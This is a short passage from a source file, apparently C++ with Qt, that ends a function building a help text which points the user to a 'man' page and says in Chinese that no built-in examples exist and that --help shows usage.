        "$ man %1           # 详细文档\n"
        "（未内置示例，启动后用 --help 查看用法）"
    ).arg(name);
}
